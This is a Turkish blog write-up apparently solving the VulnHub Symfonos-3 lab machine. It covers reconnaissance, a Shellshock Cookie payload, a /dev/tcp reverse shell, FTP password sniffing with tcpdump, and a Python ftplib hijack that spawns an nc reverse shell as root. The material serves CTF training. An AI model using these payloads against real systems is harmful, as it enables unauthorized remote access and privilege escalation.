---
title: "VULNHUB Symfonos-3 Write Up"
date: 2020-11-10T20:17:56+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,shellshock,CVE-2014-6278,tcpdump,Library Hijacking] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [Vulnhub](https://www.vulnhub.com/entry/symfonos-31,332/) 'da yer alan Symfonos-3  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/symfonos3/cover.png
  
---
*Merhaba, Bu yazımda sizlere [Vulnhub](https://www.vulnhub.com/entry/symfonos-31,332/) 'da yer alan Symfonos-3  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...*

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/symfonos3/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Nmap ile port ve servis taraması yapılır.
```bash
sudo nmap -sV -sC -p- 192.168.56.122
```
{{< image src="/images/vulnhub/symfonos3/nmap.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Ftp servisi anonymous erişime açık değildir. Ayrıca servis sürümünde çalışan bir exploit bulunamamıştır. Bilgi toplama işlemine 80. porttan devam edilir.

{{< image src="/images/vulnhub/symfonos3/website.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Gobuster aracı ile web dizininde tarama gerçekleştirilir.
```txt
gobuster dir -u http://192.168.56.122 -w /usr/share/wordlists/dirb/big.txt
```

{{< image src="/images/vulnhub/symfonos3/g1.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

*/gate* dizinine gidilir. Dizinde yapılan tarama sonucunda bir bilgi elde edilememektedir.

{{< image src="/images/vulnhub/symfonos3/website2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Keşif işlemine ***/cgi-bin*** dizini ile devam edilir. Daha büyük bir wordlist ile dizin taraması yapıldığında underworld dizini tespit edilir. 

```bash
gobuster dir -u http://192.168.56.122/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

{{< image src="/images/vulnhub/symfonos3/g2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

***/cgi-bin/underworld*** sayfasına istek atıldığında zaman bilgisi ve cpu kullanım durumunu gösteren bir sayfa görülmektedir. 

{{< image src="/images/vulnhub/symfonos3/underworld.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

*/cgi-bin dizinine çalışan bir uygulama olması akıllara hemen shellshock zafiyetini getirmektedir. Hemen burpsuite ile sayfa test edilir.*
```
Cookie: () { :;}; echo;echo "test"
```

{{< image src="/images/vulnhub/symfonos3/sh1.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

## 2. Erişim Sağlanması

Cookie ile gönderilen komutların çalıştırıldığı görülmektedir. Reverse shell bağlantısı için gerekli düzenlemeler yapılır.
```
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/192.168.56.105/4444 0>&1
```
{{< image src="/images/vulnhub/symfonos3/sh2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}
<br>
{{< image src="/images/vulnhub/symfonos3/cerberu.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

LinEnum betiği çalıştırılarak sistem hakkında bilgi toplanılır. İşlem sonucunda **tcpdump** aracının root yetkisi ile çalıştırılabildiği görülmektedir.

{{< image src="/images/vulnhub/symfonos3/getcap.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

tcpdump aracı ile loopback arayüzünde 21. porttan yapılan iletişim dinlenir. Ftp protokolü clear text olarak haberleşme sağladığından paket içeriklerini okumak kolay olmaktadır.

```txt
tcpdump -i lo -n port 21
```
```
tcpdump -i lo -n port 21
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
13:22:01.471858 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [S], seq 3896082630, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 0,nop,wscale 7], length 0
13:22:01.471873 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [S.], seq 558047581, ack 3896082631, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 221098,nop,wscale 7], length 0
13:22:01.471886 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [.], ack 1, win 342, options [nop,nop,TS val 221098 ecr 221098], length 0
13:22:01.474934 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [P.], seq 1:56, ack 1, win 342, options [nop,nop,TS val 221099 ecr 221098], length 55: FTP: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
13:22:01.475029 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [.], ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.475380 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 12: FTP: USER hades
13:22:01.475391 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [.], ack 13, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.476653 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 221100 ecr 221099], length 33: FTP: 331 Password required for hades
13:22:01.476747 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 221100 ecr 221100], length 23: FTP: PASS PTpZTfU4vxgzvRBE
13:22:01.490197 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [P.], seq 89:115, ack 36, win 342, options [nop,nop,TS val 221102 ecr 221100], length 26: FTP: 230 User hades logged in
13:22:01.490404 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [P.], seq 36:51, ack 115, win 342, options [nop,nop,TS val 221102 ecr 221102], length 15: FTP: CWD /srv/ftp/
13:22:01.491515 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [P.], seq 115:143, ack 51, win 342, options [nop,nop,TS val 221103 ecr 221102], length 28: FTP: 250 CWD command successful
13:22:01.495524 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [F.], seq 51, ack 143, win 342, options [nop,nop,TS val 221104 ecr 221103], length 0
13:22:01.495852 IP 127.0.0.1.21 > 127.0.0.1.33106: Flags [F.], seq 143, ack 52, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
13:22:01.495870 IP 127.0.0.1.33106 > 127.0.0.1.21: Flags [.], ack 144, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
```
İşlem sonucunda **hades** kullanıcısına ait hesap bilgileri elde edilir. ```PASS PTpZTfU4vxgzvRBE``` Elde edilen parola ile ssh bağlantısı sağlanır.
```
ssh hades@192.168.56.122
```
## 3. Yetki Yükseltme

Hades kullanıcısı ile LinEnum betiği çalıştırıldığında yetki yükseltme için herhangi bir bilgi elde edilemektedir. *İlk olarak hades kullanıcısına ait tüm dosyalar tespit edilir.*
```bash
cerberus@symfonos3:/home$ find / -user hades -type f 2>/dev/null
/srv/ftp/statuscheck.txt
/home/hades/.bashrc
/home/hades/.profile
/home/hades/.bash_logout
/home/hades/.wget-hsts
```
*Daha sonra hades grubunun erişime açık olan dosyalar tespit edilir.*
```bash
find / -group hades -type f 2>/dev/null
```
{{< image src="/images/vulnhub/symfonos3/hadesgr.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

**/opt/ftpclient** dizini altında bir python dosyası dikkat çekmektedir. İlk olarak dosya içeriğine göz atılır.

```python
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```
tcpdump ile yakaladığımız trafiğe sebep olan uygulama olduğu görülmektedir. ftplib kütüphanesine kod enjeckte ederek yetki yükseltilir. *(Yetki yükseltme işlemi kütüphane dosyası root yetkisinde olmasından kaynaklıdır.)* İlk olarak kütüphanenin dizini tespit edilir.

{{< image src="/images/vulnhub/symfonos3/libsearch.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

***gods** grubuna üye kullanıcıların dosya üzerinde yazma yetkisi bulunmaktadır. `id` komutu ile üye olduğumuz grupları kontrol ettiğimizde hades kullanıcısının gods grubuna üye olduğu görülmektedir.*

{{< image src="/images/vulnhub/symfonos3/id.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Komutlar sıra ile girilerek ftplib.py dosyası içeriği shell alacak şekilde değiştirilir.

```bash
echo "import os" > ftplib.py
echo 'os.system("/bin/nc -e /bin/bash 192.168.56.105 3333")' >> ftplib.py
```

{{< image src="/images/vulnhub/symfonos3/ftplib.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Nc ile 3333 numaralı port dinlenir. Ftpclient.py dosyası çalıştırıldığında hata olmasına rağmen terminal bağlantısı sağlanır.

{{< image src="/images/vulnhub/symfonos3/run.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}
<br>
{{< image src="/images/vulnhub/symfonos3/shell.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

/root dizini altında yer alan proof.txt dosyası görüntülenerek makina çözümleme işlemi tamamlanır.

{{< image src="/images/vulnhub/symfonos3/rootflag.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

*Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah’a emanet olun…*





